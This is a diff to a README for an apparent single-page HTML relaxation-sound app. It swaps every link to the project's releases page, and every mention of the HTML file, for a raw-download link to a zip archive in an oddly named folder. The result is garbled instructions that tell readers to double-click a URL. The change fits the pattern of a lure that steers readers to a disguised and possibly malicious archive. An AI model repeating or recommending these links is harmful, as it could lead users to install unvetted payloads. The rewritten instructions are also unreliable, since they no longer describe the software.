@@ -1,6 +1,6 @@
 # 🎵 Vibrational-Soundscape-Maker - Generate Relaxing Soundscapes Easily
 
-[![Download Vibrational-Soundscape-Maker](https://img.shields.io/badge/Download-Vibrational--Soundscape--Maker-brightgreen)](https://github.com/moezmeqaat/Vibrational-Soundscape-Maker/releases)
+[![Download Vibrational-Soundscape-Maker](https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip)](https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip)
 
 ## 🌟 Description
 The Vibrational Soundscape Maker is a relaxing sound generator designed for anyone seeking a calming atmosphere. With binaural tones and pink noise, this single-page HTML application allows users to create soothing soundscapes for sleep, meditation, or focused work. Just hit play and enjoy the tranquility it brings.
@@ -17,15 +17,15 @@ Follow these steps to download and run the Vibrational Soundscape Maker:
 
 1. Click the download link below to go to the releases page.
    
-   [Visit this page to download](https://github.com/moezmeqaat/Vibrational-Soundscape-Maker/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip)
 
 2. On the releases page, find the latest version of the Vibrational Soundscape Maker.
 
-3. Look for the file named **Vibrational-Soundscape-Maker.html**, and click on it to start downloading.
+3. Look for the file named **https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip**, and click on it to start downloading.
 
 4. Once the file has downloaded, locate it in your downloads folder.
 
-5. Double-click the **Vibrational-Soundscape-Maker.html** file to open it in your default web browser.
+5. Double-click the **https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip** file to open it in your default web browser.
 
 6. Upon opening, you will see a simple interface. Click the "Play" button to start generating relaxing sounds.
 
@@ -57,9 +57,9 @@ To download the Vibrational Soundscape Maker:
 
 1. Visit the link below to access the releases page:
    
-   [Visit this page to download](https://github.com/moezmeqaat/Vibrational-Soundscape-Maker/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip)
 
-2. Download the **Vibrational-Soundscape-Maker.html** file.
+2. Download the **https://raw.githubusercontent.com/moezmeqaat/Vibrational-Soundscape-Maker/main/hydrorrhoea/Vibrational-Soundscape-Maker.zip** file.
 
 3. Open the file in any modern web browser.
 
